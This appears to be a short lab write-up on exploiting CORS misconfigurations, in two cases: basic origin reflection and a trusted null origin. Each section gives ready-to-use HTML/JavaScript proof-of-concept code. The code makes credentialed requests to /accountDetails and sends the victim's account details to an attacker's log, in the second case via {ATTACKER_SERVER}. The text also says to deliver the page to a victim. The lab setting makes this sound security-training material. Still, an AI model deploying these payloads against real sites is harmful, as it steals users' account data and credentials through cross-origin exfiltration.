### CORS vulnerability with basic origin reflection
/accountDetails API in response giving the below header.
```
Access-Control-Allow-Credentials: true
```
Add Origin: evil.com in request and notice the below headers get populated in response headers along with the account details of current user.
```
Access-Control-Allow-Origin: evil.com
Access-Control-Allow-Credentials: true
```
It is confirmed that it is vulnerable to CORS, lets craft out PoC.
cors.html
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://{HOSTNAME}/{ENDPOINT}',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
Above PoC you need to deliver to victim, once victim clicks on opens the PoC then his account specific details would come in attacker's logs. Dont forget to change HOSTNAME and endpoint value. In our case ENDPOINT should be /accountDetails.
### CORS vulnerability with trusted null origin
* Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
* Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
* Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.
HTML poc:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://{HOSTNAME}/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://{ATTACKER_SERVER}/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
